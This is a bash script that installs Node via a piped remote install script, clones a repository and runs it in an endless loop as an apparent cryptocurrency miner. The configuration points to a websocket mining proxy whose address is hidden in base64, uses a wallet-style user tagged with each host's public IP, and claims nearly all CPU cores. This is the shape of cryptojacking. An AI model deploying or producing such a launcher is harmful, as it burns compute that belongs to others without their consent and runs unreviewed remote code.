#!/bin/bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
sleep 2

# in lieu of restarting the shell
\. "$HOME/.nvm/nvm.sh"

nvm install 23
sleep 2

nvm current
sleep 2

git clone https://github.com/olivertarbell532/nano-mino.git
sleep 2
cd nano-mino
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_ShinyNewWasm_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 3`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

cat > data.json <<END
{
  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbnhwLnRlYXRzcHJheS51azo4MjQz",
  "config": { "threads": $used_num_of_cores, "log": true },
  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "c=MAZA,m=solo", "argent": "web-wasm/1.0" }
}
END

sleep 2

while true
do
node app.js
sleep 5
done
